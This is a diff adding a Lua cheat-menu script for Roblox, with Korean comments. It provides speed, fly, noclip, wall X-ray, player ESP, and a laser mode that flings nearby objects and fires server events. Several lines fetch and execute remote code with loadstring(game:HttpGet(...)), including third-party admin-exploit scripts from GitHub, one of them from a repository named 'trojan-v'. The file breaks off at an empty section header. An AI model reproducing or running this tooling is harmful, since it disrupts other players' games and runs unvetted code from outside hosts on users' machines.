@@ -1,0 +1,866 @@
+-- Rayfield Hub | 40 Features Edition (KeySystem=false, rod 레이저 + Rod Projectile + Fling 통합)
+-- 붙여넣기: StarterPlayer -> StarterPlayerScripts -> LocalScript (이 파일로 덮어쓰기)
+
+local ok, Rayfield = pcall(function()
+    return loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+end)
+if not ok or not Rayfield then
+    warn("Rayfield 로드 실패:", Rayfield)
+    return
+end
+
+local function safeCall(fn)
+    return function(...)
+        local ok2, err = pcall(fn, ...)
+        if not ok2 then
+            warn("Callback error:", err)
+            pcall(function()
+                if Rayfield and Rayfield.Notify then
+                    Rayfield:Notify({ Title = "Script error", Content = tostring(err), Duration = 5 })
+                end
+            end)
+        end
+    end
+end
+
+local Window = Rayfield:CreateWindow({
+   Name = "Rayfield Hub | 40 Features Edition",
+   Icon = 0,
+   LoadingTitle = "Loading 40 Features...",
+   LoadingSubtitle = "Mobile & PC Supported",
+   Theme = "Default",
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false,
+   ConfigurationSaving = { Enabled = false },
+   KeySystem = false
+})
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local Lighting = game:GetService("Lighting")
+local UserInputService = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
+local Debris = game:GetService("Debris")
+local VirtualUser = game:GetService("VirtualUser")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- 플레이어/캐릭터/카메라 준비
+local player = Players.LocalPlayer
+if not player then
+    Players.PlayerAdded:Wait()
+    player = Players.LocalPlayer
+end
+
+local camera = Workspace.CurrentCamera
+if not camera then
+    camera = Workspace:FindFirstChildOfClass("Camera")
+end
+
+local mouse
+pcall(function() mouse = player:GetMouse() end)
+
+-- mouse1click 대체 (없으면 VirtualUser로)
+local function doMouseClick()
+    if type(mouse1click) == "function" then
+        pcall(mouse1click)
+        return
+    end
+    pcall(function()
+        VirtualUser:Button1Down(Vector2.new(0,0), camera)
+        task.wait(0.02)
+        VirtualUser:Button1Up(Vector2.new(0,0), camera)
+    end)
+end
+
+pcall(function() Rayfield:Notify({ Title = "Rayfield", Content = "Stabilized script loaded", Duration = 3 }) end)
+
+-- 캐릭터 관리
+local character = player.Character
+local function updateCharacter(c) character = c end
+if not player.Character or not player.Character.Parent then
+    player.CharacterAdded:Wait()
+    character = player.Character
+else
+    character = player.Character
+end
+player.CharacterAdded:Connect(updateCharacter)
+
+local function clamp(n,a,b) return math.max(a, math.min(b, n)) end
+
+---------------------------------------------------------
+-- TAB 1: MOVEMENT (1 ~ 10)
+---------------------------------------------------------
+local MoveTab = Window:CreateTab("Movement", 4483362458)
+
+MoveTab:CreateSlider({
+   Name = "1. WalkSpeed", Range = {16, 500}, Increment = 1, CurrentValue = 16,
+   Callback = safeCall(function(V) if character and character:FindFirstChild("Humanoid") then character.Humanoid.WalkSpeed = V end end)
+})
+
+MoveTab:CreateSlider({
+   Name = "2. JumpPower", Range = {50, 500}, Increment = 1, CurrentValue = 50,
+   Callback = safeCall(function(V) if character and character:FindFirstChild("Humanoid") then local h = character.Humanoid; h.UseJumpPower = true; h.JumpPower = V end end)
+})
+
+MoveTab:CreateSlider({ Name = "3. Gravity Control", Range = {0, 196}, Increment = 1, CurrentValue = 196, Callback = safeCall(function(V) Workspace.Gravity = V end) })
+MoveTab:CreateSlider({ Name = "4. Field of View (FOV)", Range = {30, 120}, Increment = 1, CurrentValue = 70, Callback = safeCall(function(V) if camera then camera.FieldOfView = V end end) })
+MoveTab:CreateSlider({ Name = "5. Max Camera Zoom", Range = {128, 5000}, Increment = 100, CurrentValue = 400, Callback = safeCall(function(V) pcall(function() player.CameraMaxZoomDistance = V end) end) })
+
+-- Infinite Jump
+local infJumpConn = nil
+MoveTab:CreateToggle({
+   Name = "6. Infinite Jump", CurrentValue = false,
+   Callback = safeCall(function(V)
+      if V then
+         if not infJumpConn then
+            infJumpConn = UserInputService.JumpRequest:Connect(function()
+               if character and character:FindFirstChildOfClass("Humanoid") then
+                  local hum = character:FindFirstChildOfClass("Humanoid")
+                  pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
+               end
+            end)
+         end
+      else
+         if infJumpConn then infJumpConn:Disconnect(); infJumpConn = nil end
+      end
+   end)
+})
+
+-- Fly
+local flyConn = nil
+local flySpeed = 80
+MoveTab:CreateToggle({
+   Name = "7. Fly", CurrentValue = false,
+   Callback = safeCall(function(V)
+      if V then
+         if not flyConn then
+            flyConn = RunService.RenderStepped:Connect(function()
+               if not (character and character:FindFirstChild("HumanoidRootPart")) then return end
+               local hrp = character.HumanoidRootPart
+               local humanoid = character:FindFirstChildOfClass("Humanoid")
+               if humanoid and humanoid.MoveDirection and humanoid.MoveDirection.Magnitude > 0 and camera then
+                  hrp.AssemblyLinearVelocity = camera.CFrame.LookVector * flySpeed
+               else
+                  hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
+               end
+            end)
+         end
+      else
+         if flyConn then flyConn:Disconnect(); flyConn = nil end
+      end
+   end)
+})
+
+-- Noclip
+local noclip = false
+RunService.Stepped:Connect(function()
+   if noclip and character then
+      for _, p in pairs(character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end
+   end
+end)
+MoveTab:CreateToggle({ Name = "8. Noclip", CurrentValue = false, Callback = safeCall(function(V) noclip = V end) })
+
+-- Air Walk
+local airPart = nil
+local airConn = nil
+MoveTab:CreateToggle({
+   Name = "9. Air Walk (Invisible Floor)", CurrentValue = false,
+   Callback = safeCall(function(V)
+      if V then
+         if not airPart then
+            airPart = Instance.new("Part")
+            airPart.Size = Vector3.new(6,1,6)
+            airPart.Anchored = true
+            airPart.Transparency = 1
+            airPart.CanCollide = true
+            airPart.Name = "RayfieldAirWalk"
+            airPart.Parent = Workspace
+         end
+         if airConn then airConn:Disconnect() end
+         airConn = RunService.RenderStepped:Connect(function() if airPart and character and character:FindFirstChild("HumanoidRootPart") then airPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0) end end)
+      else
+         if airConn then airConn:Disconnect(); airConn = nil end
+         if airPart then airPart:Destroy(); airPart = nil end
+      end
+   end)
+})
+
+MoveTab:CreateToggle({ Name = "10. Platform Stand", CurrentValue = false, Callback = safeCall(function(V) if character and character:FindFirstChild("Humanoid") then character.Humanoid.PlatformStand = V end end) })
+
+---------------------------------------------------------
+-- TAB 2: SUPERMAN & COMBAT (11 ~ 20)
+---------------------------------------------------------
+local CombatTab = Window:CreateTab("Superman & Combat", 4483362458)
+
+local superman = false
+local prevWalkSpeed = 16
+CombatTab:CreateToggle({
+   Name = "11. Superman Mode (Speed & Aura)", CurrentValue = false,
+   Callback = safeCall(function(V)
+      superman = V
+      if character and character:FindFirstChild("Humanoid") then
+         if V then prevWalkSpeed = character.Humanoid.WalkSpeed or 16; character.Humanoid.WalkSpeed = 150
+         else character.Humanoid.WalkSpeed = prevWalkSpeed or 16 end
+      end
+   end)
+})
+
+task.spawn(function()
+   while true do
+      task.wait(0.1)
+      if superman and character and character:FindFirstChild("HumanoidRootPart") then
+         local params = OverlapParams.new()
+         params.FilterType = Enum.RaycastFilterType.Exclude
+         params.FilterDescendantsInstances = { character }
+         local pos = character.HumanoidRootPart.Position
+         local parts = Workspace:GetPartBoundsInRadius(pos, 15, params)
+         for _, part in ipairs(parts) do
+            if part and not part.Anchored then
+               pcall(function() part.AssemblyLinearVelocity = Vector3.new(math.random(-10000,10000), 10000, math.random(-10000,10000)) end)
+            end
+         end
+      end
+   end
+end)
+
+-- helper: local AOE fallback (기존 스크립트에서 사용)
+local function localAoeApply(hitPos, originPos, force, upBias, aoe)
+    local params = OverlapParams.new()
+    params.FilterType = Enum.RaycastFilterType.Exclude
+    params.FilterDescendantsInstances = { character }
+    local parts = Workspace:GetPartBoundsInRadius(hitPos, aoe, params)
+    for _, p in ipairs(parts) do
+        if p and p:IsA("BasePart") and not p.Anchored and p.CanCollide and not p:IsDescendantOf(character) then
+            pcall(function()
+                local dir = (p.Position - originPos)
+                local unit = (dir.Magnitude > 0 and dir.Unit) or Vector3.new(0,1,0)
+                p.AssemblyLinearVelocity = unit * (force * 0.35) + Vector3.new(0, upBias * 0.35, 0)
+            end)
+        end
+    end
+end
+-- ===== helper end =====
+
+-- ===================================================================
+-- rod(막대기) 슈퍼맨 레이저 섹션 (통합) + Fling & Rod-Projectile UI
+-- ===================================================================
+local laserActive, holding = false, false
+local laserStrength = 60000
+local laserUpBias = 20000
+local laserAOE = 8
+local laserRange = 200
+local laserCooldown = 0.06
+local coreColor = Color3.fromRGB(255, 120, 80)
+local glowColor = Color3.fromRGB(255, 40, 40)
+local coreThickness = 0.12
+local lastLaser = 0
+
+-- Laser UI
+CombatTab:CreateToggle({ Name = "12. Continuous Laser Beam", CurrentValue = false, Callback = safeCall(function(V) laserActive = V end) })
+CombatTab:CreateSlider({ Name = "Laser Strength", Range = {1000, 15000000}, Increment = 1000, CurrentValue = laserStrength, Callback = safeCall(function(V) laserStrength = V end) })
+CombatTab:CreateSlider({ Name = "Laser Up Bias", Range = {0, 100000}, Increment = 1000, CurrentValue = laserUpBias, Callback = safeCall(function(V) laserUpBias = V end) })
+CombatTab:CreateSlider({ Name = "Laser AOE Radius", Range = {0, 50}, Increment = 1, CurrentValue = laserAOE, Callback = safeCall(function(V) laserAOE = V end) })
+CombatTab:CreateSlider({ Name = "Laser Range", Range = {50, 400}, Increment = 5, CurrentValue = laserRange, Callback = safeCall(function(V) laserRange = V end) })
+CombatTab:CreateSlider({ Name = "Laser Cooldown", Range = {0.02, 0.5}, Increment = 0.01, CurrentValue = laserCooldown, Callback = safeCall(function(V) laserCooldown = V end) })
+
+-- Fling toggle (client-side request flag)
+local flingEnabled = true
+CombatTab:CreateToggle({ Name = "Enable Fling on Hit", CurrentValue = true, Callback = safeCall(function(V) flingEnabled = V end) })
+
+-- Rod projectile UI (spawn rod projectile server-side) and power multiplier
+local spawnRodProjectile = false
+local powerMultiplier = 1
+CombatTab:CreateToggle({ Name = "Spawn Rod Projectile", CurrentValue = false, Callback = safeCall(function(V) spawnRodProjectile = V end) })
+CombatTab:CreateSlider({ Name = "Power Multiplier (Admin up to 50000)", Range = {1, 50000}, Increment = 1, CurrentValue = powerMultiplier, Callback = safeCall(function(V) powerMultiplier = V end) })
+
+UserInputService.InputBegan:Connect(safeCall(function(input, gp)
+    if gp then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then holding = true end
+end))
+UserInputService.InputEnded:Connect(safeCall(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then holding = false end
+end))
+
+local LASER_EVENT = ReplicatedStorage:FindFirstChild("RayfieldLaserEvent")
+
+-- spark template
+local sparkTemplate = (function()
+    local p = Instance.new("ParticleEmitter")
+    p.Texture = "rbxasset://textures/particles/sparkles_main.dds"
+    p.Rate = 0
+    p.Lifetime = NumberRange.new(0.08,0.22)
+    p.Speed = NumberRange.new(40,140)
+    p.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.6), NumberSequenceKeypoint.new(1, 0)})
+    p.Rotation = NumberRange.new(0,360)
+    p.RotSpeed = NumberRange.new(-200,200)
+    p.SpreadAngle = Vector2.new(180,180)
+    p.LightEmission = 1
+    p.Color = ColorSequence.new(Color3.fromRGB(255,200,100))
+    return p
+end)()
+
+local function spawnImpactEffects(pos, normal, color)
+    local part = Instance.new("Part")
+    part.Size = Vector3.new(0.2,0.2,0.2)
+    part.Transparency = 1
+    part.Anchored = true
+    part.CanCollide = false
+    part.Position = pos
+    part.Parent = Workspace
+
+    local att = Instance.new("Attachment", part)
+    local em = sparkTemplate:Clone()
+    em.Parent = att
+    em.Color = ColorSequence.new(color or Color3.fromRGB(255,180,80))
+    em:Emit(24)
+
+    local smoke = Instance.new("ParticleEmitter", att)
+    smoke.Texture = "rbxasset://textures/particles/smoke_main.dds"
+    smoke.Lifetime = NumberRange.new(0.4,1.0)
+    smoke.Rate = 0
+    smoke:Emit(8)
+    smoke.Speed = NumberRange.new(2,8)
+    smoke.Size = NumberSequence.new({NumberSequenceKeypoint.new(0,0.6), NumberSequenceKeypoint.new(1,1.4)})
+    smoke.Color = ColorSequence.new(Color3.fromRGB(50,50,50))
+    smoke.Rotation = NumberRange.new(0,360)
+    smoke.RotSpeed = NumberRange.new(-30,30)
+
+    Debris:AddItem(part, 1.2)
+end
+
+local function applyScorchDecal(hitPart, hitPos, normal)
+    if not hitPart or not hitPart:IsA("BasePart") then return end
+    local face = Enum.NormalId.Front
+    local nx, ny, nz = normal.X, normal.Y, normal.Z
+    local ax = math.abs(nx); local ay = math.abs(ny); local az = math.abs(nz)
+    if ay >= ax and ay >= az then
+        face = (ny > 0) and Enum.NormalId.Top or Enum.NormalId.Bottom
+    elseif ax >= ay and ax >= az then
+        face = (nx > 0) and Enum.NormalId.Right or Enum.NormalId.Left
+    else
+        face = (nz > 0) and Enum.NormalId.Back or Enum.NormalId.Front
+    end
+    local dec = Instance.new("Decal")
+    dec.Name = "RayScorchDecal"
+    dec.Texture = "" -- optional scorch texture id
+    dec.Transparency = 1
+    dec.Face = face
+    dec.Parent = hitPart
+    Debris:AddItem(dec, 6)
+end
+
+-- rod visuals
+local originAttachment = nil
+local rodPart = nil
+local rodGlow = nil
+local endPart = nil
+local endAttachment = nil
+local muzzleLight = nil
+local rodOn = false
+
+-- 텍스처 자리표시자 "a" (실사용 시 rbxassetid://ID 로 교체)
+local LASER_ROD_TEXTURE = "a"
+
+local function createRodObjects()
+    if rodOn then return end
+    if not (character and character:FindFirstChild("Head")) then return end
+    local head = character.Head
+
+    originAttachment = head:FindFirstChild("EyeLaserOrigin") or Instance.new("Attachment", head)
+    originAttachment.Name = "EyeLaserOrigin"
+    originAttachment.Position = Vector3.new(0, 0.12, 0.35)
+
+    rodPart = Instance.new("Part")
+    rodPart.Name = "LaserRod"
+    rodPart.Anchored = true
+    rodPart.CanCollide = false
+    rodPart.Material = Enum.Material.Neon
+    rodPart.Color = coreColor
+    rodPart.Transparency = 0
+    rodPart.Size = Vector3.new(0.12, 0.12, 1)
+    rodPart.Parent = Workspace
+
+    -- 텍스처(Decal) 붙이기: numeric ID가 아니면 스킵
+    if LASER_ROD_TEXTURE and LASER_ROD_TEXTURE ~= "" and LASER_ROD_TEXTURE:match("%d+") then
+        local faces = { Front = Enum.NormalId.Front, Back = Enum.NormalId.Back, Left = Enum.NormalId.Left, Right = Enum.NormalId.Right, Top = Enum.NormalId.Top, Bottom = Enum.NormalId.Bottom }
+        for name, faceEnum in pairs(faces) do
+            local dec = Instance.new("Decal")
+            dec.Name = "LaserRodDecal_" .. tostring(name)
+            dec.Texture = LASER_ROD_TEXTURE
+            dec.Face = faceEnum
+            dec.Parent = rodPart
+        end
+    end
+
+    rodGlow = Instance.new("Part")
+    rodGlow.Name = "LaserRodGlow"
+    rodGlow.Anchored = true
+    rodGlow.CanCollide = false
+    rodGlow.Material = Enum.Material.Neon
+    rodGlow.Color = glowColor
+    rodGlow.Transparency = 0.5
+    rodGlow.Size = Vector3.new(0.36, 0.36, 1.02)
+    rodGlow.Parent = Workspace
+
+    endPart = Instance.new("Part")
+    endPart.Name = "LaserEnd"
+    endPart.Anchored = true
+    endPart.CanCollide = false
+    endPart.Size = Vector3.new(0.2,0.2,0.2)
+    endPart.Transparency = 1
+    endPart.Parent = Workspace
+
+    endAttachment = Instance.new("Attachment", endPart)
+    endAttachment.Name = "LaserEndAttach"
+
+    muzzleLight = Instance.new("PointLight", originAttachment.Parent)
+    muzzleLight.Name = "LaserMuzzleLight"
+    muzzleLight.Color = coreColor
+    muzzleLight.Range = 8
+    muzzleLight.Brightness = 2
+
+    rodOn = true
+end
+
+local function destroyRodObjects()
+    pcall(function()
+        if rodPart and rodPart.Parent then rodPart:Destroy() end
+        if rodGlow and rodGlow.Parent then rodGlow:Destroy() end
+        if endPart and endPart.Parent then endPart:Destroy() end
+        if muzzleLight and muzzleLight.Parent then muzzleLight:Destroy() end
+        if originAttachment and originAttachment.Parent and originAttachment.Name == "EyeLaserOrigin" then
+            originAttachment.WorldCFrame = originAttachment.Parent.CFrame * CFrame.new(0,0.12,0.35)
+        end
+    end)
+    rodOn = false
+end
+
+local function updateRod(originPos, hitPos)
+    local dir = hitPos - originPos
+    local length = dir.Magnitude
+    if length < 0.2 then length = 0.2 end
+    local cf = CFrame.new(originPos, hitPos) * CFrame.new(0,0,-length/2)
+    local thickness = clamp(coreThickness + (laserStrength/15000000) * 0.6, 0.06, 1.2)
+    rodPart.Size = Vector3.new(thickness, thickness, length)
+    rodPart.CFrame = cf
+    rodGlow.Size = Vector3.new(thickness * 3.5, thickness * 3.5, length * 1.02)
+    rodGlow.CFrame = cf
+    endPart.Position = hitPos
+    endAttachment.WorldPosition = hitPos
+    if muzzleLight then muzzleLight.Range = clamp(length/8, 6, 24); muzzleLight.Color = coreColor end
+end
+
+local function spawnRodImpact(hitPos, normal)
+    spawnImpactEffects(hitPos, normal or Vector3.new(0,1,0), coreColor)
+    local flash = Instance.new("Part")
+    flash.Size = Vector3.new(0.4,0.4,0.4)
+    flash.Transparency = 1
+    flash.Anchored = true
+    flash.CanCollide = false
+    flash.Position = hitPos
+    flash.Parent = Workspace
+    local light = Instance.new("PointLight", flash)
+    light.Color = coreColor
+    light.Range = 6
+    light.Brightness = 6
+    Debris:AddItem(flash, 0.25)
+end
+
+-- ===== startRodLoop + 로컬 프로젝트타일 처리 통합된 동작 =====
+
+local beamRunning = false
+local beamLoopConn = nil
+
+local function spawnLocalRodVisual(originCFrame, dir, speed, color)
+    local rod = Instance.new("Part")
+    rod.Name = "Local_Rod_Visual"
+    rod.Size = Vector3.new(0.15, 0.15, 1)
+    rod.CFrame = originCFrame * CFrame.new(0, 0, -rod.Size.Z/2)
+    rod.Anchored = false
+    rod.CanCollide = false
+    rod.Material = Enum.Material.Neon
+    rod.Color = color or coreColor
+    rod.Massless = true
+    rod.Parent = Workspace
+
+    local a0 = Instance.new("Attachment", rod); a0.Position = Vector3.new(0,0,rod.Size.Z/2)
+    local a1 = Instance.new("Attachment", rod); a1.Position = Vector3.new(0,0,-rod.Size.Z/2)
+    local trail = Instance.new("Trail", rod)
+    trail.Attachment0 = a0; trail.Attachment1 = a1
+    trail.Color = ColorSequence.new(color or coreColor)
+    trail.Lifetime = 0.12
+    trail.Enabled = true
+
+    local visualSpeed = clamp((speed or 60000) / 1, 0, 5e6)
+    rod.AssemblyLinearVelocity = dir.Unit * visualSpeed
+
+    local touchedConn
+    touchedConn = rod.Touched:Connect(function(hit)
+        if not hit or not hit.Parent then return end
+        if character and hit:IsDescendantOf(character) then return end
+        spawnImpactEffects(rod.Position, Vector3.new(0,1,0))
+        pcall(function()
+            if touchedConn then touchedConn:Disconnect() end
+            rod:Destroy()
+        end)
+    end)
+
+    Debris:AddItem(rod, 6)
+    return rod
+end
+
+local function startRodLoop()
+    if beamRunning then return end
+    beamRunning = true
+
+    if not spawnRodProjectile then
+        createRodObjects()
+    else
+        destroyRodObjects()
+    end
+
+    beamLoopConn = RunService.RenderStepped:Connect(safeCall(function()
+        if not (laserActive and holding and character and character:FindFirstChild("Head") and camera) then
+            if beamLoopConn then beamLoopConn:Disconnect(); beamLoopConn = nil end
+            destroyRodObjects()
+            beamRunning = false
+            return
+        end
+
+        local head = character.Head
+        if not head then return end
+
+        local originCFrame = head.CFrame * CFrame.new(0, 0.12, 0.35)
+
+        local now = tick()
+        if now - lastLaser < laserCooldown then
+            if not spawnRodProjectile and rodOn then
+                local dir = camera.CFrame.LookVector
+                local params = RaycastParams.new()
+                params.FilterDescendantsInstances = { character }
+                params.FilterType = Enum.RaycastFilterType.Exclude
+                params.IgnoreWater = true
+                local ray = Workspace:Raycast(originCFrame.Position, dir * laserRange, params)
+                local hitPos = originCFrame.Position + dir * laserRange
+                if ray then hitPos = ray.Position end
+                updateRod(originCFrame.Position, hitPos)
+            end
+            return
+        end
+
+        lastLaser = now
+
+        local dir = camera.CFrame.LookVector
+        local paramsRC = RaycastParams.new()
+        paramsRC.FilterDescendantsInstances = { character }
+        paramsRC.FilterType = Enum.RaycastFilterType.Exclude
+        paramsRC.IgnoreWater = true
+
+        local ray = Workspace:Raycast(originCFrame.Position, dir * laserRange, paramsRC)
+        local hitPos = originCFrame.Position + dir * laserRange
+        local hitPart, hitNormal = nil, Vector3.new(0,1,0)
+        if ray then
+            hitPos = ray.Position
+            hitPart = ray.Instance
+            hitNormal = ray.Normal
+        end
+
+        if spawnRodProjectile then
+            local paramsToSend = {
+                force = laserStrength,
+                upBias = laserUpBias,
+                aoe = laserAOE,
+                range = laserRange,
+                cooldown = laserCooldown,
+                fling = flingEnabled == true,
+                includeObjects = true,
+                spawnRod = true,
+                powerMultiplier = tonumber(powerMultiplier) or 1,
+                lookVector = camera and camera.CFrame.LookVector or nil,
+                color = coreColor,
+            }
+
+            if LASER_EVENT then
+                pcall(function()
+                    LASER_EVENT:FireServer(hitPos, hitPart, paramsToSend)
+                end)
+            end
+
+            local visualSpeed = clamp((laserStrength * (tonumber(powerMultiplier) or 1)) / 40, 200, 5e6)
+            spawnLocalRodVisual(originCFrame, dir, visualSpeed, coreColor)
+            spawnImpactEffects(originCFrame.Position + dir * 1.5, dir, coreColor)
+
+        else
+            if hitPart and hitPart:IsA("BasePart") and not hitPart:IsDescendantOf(character) then
+                pcall(function()
+                    if hitPart and not hitPart.Anchored then
+                        local d = (hitPart.Position - originCFrame.Position)
+                        local u = (d.Magnitude > 0 and d.Unit) or Vector3.new(0,1,0)
+                        local localForce = clamp(laserStrength * 0.35, 1000, 1000000)
+                        hitPart.AssemblyLinearVelocity = u * localForce + Vector3.new(0, clamp(laserUpBias * 0.35, 0, 50000), 0)
+                    end
+                end)
+                spawnRodImpact(hitPos, hitNormal)
+                applyScorchDecal(hitPart, hitPos, hitNormal)
+
+                local paramsToSend = {
+                    force = laserStrength,
+                    upBias = laserUpBias,
+                    aoe = laserAOE,
+                    range = laserRange,
+                    cooldown = laserCooldown,
+                    fling = flingEnabled == true,
+                    includeObjects = true,
+                    spawnRod = false,
+                }
+                if LASER_EVENT then
+                    pcall(function() LASER_EVENT:FireServer(hitPos, hitPart, paramsToSend) end)
+                else
+                    pcall(localAoeApply, hitPos, originCFrame.Position, laserStrength, laserUpBias, laserAOE)
+                end
+            else
+                spawnRodImpact(hitPos, Vector3.new(0,1,0))
+                local paramsToSend = {
+                    force = laserStrength,
+                    upBias = laserUpBias,
+                    aoe = laserAOE,
+                    range = laserRange,
+                    cooldown = laserCooldown,
+                    fling = flingEnabled == true,
+                    includeObjects = true,
+                    spawnRod = false,
+                }
+                if LASER_EVENT then
+                    pcall(function() LASER_EVENT:FireServer(hitPos, nil, paramsToSend) end)
+                else
+                    pcall(localAoeApply, hitPos, originCFrame.Position, laserStrength, laserUpBias, laserAOE)
+                end
+            end
+
+            if rodOn then
+                updateRod(originCFrame.Position, hitPos)
+            end
+        end
+    end))
+end
+
+RunService.RenderStepped:Connect(safeCall(function()
+    if laserActive and holding and character and character:FindFirstChild("Head") and mouse then
+        if not beamRunning then startRodLoop() end
+    end
+end))
+
+-- ===================================================================
+-- Admin & Server Tab (복원된 관리자 기능, 서버 권한 검사 포함)
+-- ===================================================================
+local AdminTab = Window:CreateTab("Admin & Server", 4483362458)
+
+-- helper: ask server if current player is admin
+local function isServerAdmin()
+    local adminFn = ReplicatedStorage:FindFirstChild("RayfieldAdminCheck")
+    if not adminFn or not adminFn:IsA("RemoteFunction") then
+        return false
+    end
+    local ok2, res = pcall(function() return adminFn:InvokeServer() end)
+    if ok2 and res == true then return true end
+    return false
+end
+
+local function requireAdminNotify()
+    pcall(function()
+        if Rayfield and Rayfield.Notify then
+            Rayfield:Notify({ Title = "Admin", Content = "이 기능을 사용하려면 관리자 권한이 필요합니다.", Duration = 4 })
+        else
+            warn("Admin required")
+        end
+    end)
+end
+
+AdminTab:CreateButton({ Name = "31. Run Infinite Yield Admin", Callback = safeCall(function()
+    if not isServerAdmin() then return requireAdminNotify() end
+    pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() end)
+end) })
+
+AdminTab:CreateButton({ Name = "32. Run CMD-X Admin", Callback = safeCall(function()
+    if not isServerAdmin() then return requireAdminNotify() end
+    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))() end)
+end) })
+
+AdminTab:CreateButton({ Name = "33. Run Reviz Admin", Callback = safeCall(function()
+    if not isServerAdmin() then return requireAdminNotify() end
+    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/trojan-v/roblox-scripts/main/revizadmin"))() end)
+end) })
+
+AdminTab:CreateButton({ Name = "34. Server Hop", Callback = safeCall(function()
+    if not isServerAdmin() then return requireAdminNotify() end
+    pcall(function() TeleportService:Teleport(game.PlaceId, player) end)
+end) })
+
+AdminTab:CreateButton({ Name = "35. Copy Job ID", Callback = safeCall(function()
+    pcall(function() if setclipboard then setclipboard(tostring(game.JobId)) end end)
+    pcall(function() Rayfield:Notify({ Title = "Job ID", Content = tostring(game.JobId), Duration = 3 }) end)
+end) })
+
+-- ===================================================================
+-- VISUALS Tab (Camera Lock + original visuals restored)
+-- ===================================================================
+local VisTab = Window:CreateTab("Visuals", 4483362458)
+
+-- Camera Lock
+local cameraLock = false
+local camLockConn = nil
+local prevCameraType = nil
+local prevCameraSubject = nil
+local camOffsetY = 0.12
+local camOffsetZ = 0.05
+
+VisTab:CreateToggle({ Name = "Lock Camera to Head (Cinematic)", CurrentValue = false, Callback = safeCall(function(V)
+    cameraLock = V
+    if V then
+        if not character or not character:FindFirstChild("Head") then return end
+        prevCameraType = camera.CameraType
+        prevCameraSubject = camera.CameraSubject
+        camera.CameraType = Enum.CameraType.Scriptable
+        if camLockConn then camLockConn:Disconnect(); camLockConn = nil end
+        camLockConn = RunService.RenderStepped:Connect(function()
+            if not (cameraLock and character and character:FindFirstChild("Head")) then return end
+            local head = character.Head
+            local targetCFrame = head.CFrame * CFrame.new(0, camOffsetY, camOffsetZ)
+            camera.CFrame = targetCFrame
+        end)
+    else
+        if camLockConn then camLockConn:Disconnect(); camLockConn = nil end
+        camera.CameraType = prevCameraType or Enum.CameraType.Custom
+        if prevCameraSubject and prevCameraSubject:IsA("Instance") then
+            pcall(function() camera.CameraSubject = prevCameraSubject end)
+        else
+            if character and character:FindFirstChildOfClass("Humanoid") then camera.CameraSubject = character:FindFirstChildOfClass("Humanoid") end
+        end
+    end
+end) })
+
+VisTab:CreateSlider({ Name = "Camera Offset Y (up)", Range = {-1, 2}, Increment = 0.01, CurrentValue = camOffsetY, Callback = safeCall(function(V) camOffsetY = V end) })
+VisTab:CreateSlider({ Name = "Camera Offset Z (forward)", Range = {-2, 2}, Increment = 0.01, CurrentValue = camOffsetZ, Callback = safeCall(function(V) camOffsetZ = V end) })
+
+-- original visuals controls (restored)
+VisTab:CreateToggle({ Name = "21. X-Ray (See Through Walls)", CurrentValue = false, Callback = safeCall(function(V) for _, p in pairs(Workspace:GetDescendants()) do if p:IsA("BasePart") and not (character and p:IsDescendantOf(character)) then p.LocalTransparencyModifier = V and 0.5 or 0 end end end) })
+VisTab:CreateToggle({ Name = "22. Player Highlight ESP", CurrentValue = false, Callback = safeCall(function(V) for _, p in pairs(Players:GetPlayers()) do if p ~= player and p.Character then if V then if not p.Character:FindFirstChild("ESPHighlight") then local h = Instance.new("Highlight"); h.Name = "ESPHighlight"; h.Parent = p.Character end else if p.Character:FindFirstChild("ESPHighlight") then p.Character.ESPHighlight:Destroy() end end end end end) })
+VisTab:CreateToggle({ Name = "23. No Fog", CurrentValue = false, Callback = safeCall(function(V) Lighting.FogEnd = V and 999999 or 1000 end) })
+VisTab:CreateToggle({ Name = "24. Night Vision / Fullbright", CurrentValue = false, Callback = safeCall(function(V) Lighting.Ambient = V and Color3.fromRGB(255,255,255) or Color3.fromRGB(127,127,127) end) })
+VisTab:CreateSlider({ Name = "25. Character Transparency", Range = {0, 1}, Increment = 0.1, CurrentValue = 0, Callback = safeCall(function(V) if character then for _, p in pairs(character:GetDescendants()) do if p:IsA("BasePart") then p.Transparency = V end end end end) })
+VisTab:CreateButton({ Name = "26. Visual Headless (Client)", Callback = safeCall(function() if character and character:FindFirstChild("Head") then character.Head.Transparency = 1 end end) })
+VisTab:CreateButton({ Name = "27. Visual Korblox Right Leg", Callback = safeCall(function()
+   if character then
+      local names = {"RightUpperLeg","RightLowerLeg","RightFoot","RightHip"}
+      for _, n in ipairs(names) do
+         local part = character:FindFirstChild(n)
+         if part and part:IsA("BasePart") then
+            pcall(function()
+               part.Transparency = 1
+               part.CanCollide = false
+               part.Size = Vector3.new(0.2, 0.2, 0.2)
+            end)
+         end
+      end
+   end
+end) })
+VisTab:CreateButton({ Name = "28. FPS Booster", Callback = safeCall(function() for _, v in pairs(Workspace:GetDescendants()) do if v:IsA("BasePart") then v.Material = Enum.Material.SmoothPlastic elseif v:IsA("Decal") or v:IsA("Texture") then pcall(function() v:Destroy() end) end end end) })
+VisTab:CreateSlider({ Name = "29. Change Time of Day", Range = {0, 24}, Increment = 1, CurrentValue = 12, Callback = safeCall(function(V) Lighting.TimeOfDay = tostring(V)..":00:00" end) })
+VisTab:CreateToggle({ Name = "30. Disable Shadows", CurrentValue = false, Callback = safeCall(function(V) Lighting.GlobalShadows = not V end) })
+
+-- ===================================================================
+-- UTIL Tab & remaining features (31~40)
+-- ===================================================================
